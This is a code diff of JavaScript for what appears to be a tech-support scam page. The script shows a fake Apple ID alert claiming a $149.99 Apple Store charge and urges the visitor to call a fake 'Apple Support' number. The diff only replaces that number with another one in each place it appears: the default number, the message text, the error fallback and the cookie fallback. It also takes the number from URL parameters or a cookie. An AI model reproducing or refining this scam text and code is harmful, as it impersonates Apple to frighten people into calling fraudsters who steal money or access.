@@ -72,7 +72,7 @@ function getPar(name) {
 };
 
 window.number = getPar('phone');
-window.number = (window.number ? window.number : '+1-888-417-2043');
+window.number = (window.number ? window.number : '+1(888) 790-7840');
 
 window.device = 'iPhone';
 window.refef = parseURL(document.referrer);
@@ -94,7 +94,7 @@ var phone = cookieHelper.get('phoneSetBl');
 
 function getText() {
     try {
-        var str = window.defaultText || 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-417-2043 to Freeze it!';
+        var str = window.defaultText || 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1(888) 790-7840 to Freeze it!';
 
         if (window.text && typeof window.text === 'object') {
             for (var d in window.text) {
@@ -105,7 +105,7 @@ function getText() {
         }
         return str.replace('|%model%|', window.device || 'iPhone').replace('|%ref%|', window.refef || '');
     } catch(e) {
-        return 'Your iPhone Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-417-2043 to Freeze it!';
+        return 'Your iPhone Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1(888) 790-7840 to Freeze it!';
     }
 }
 
@@ -113,7 +113,7 @@ if (!phone || phone === '') {
     phone = getURLParameter('phone');
 }
 if (!phone || phone === '') {
-    phone = window.number || '+1-888-417-2043';
+    phone = window.number || '+1(888) 790-7840';
 }
 
 if (!text) {
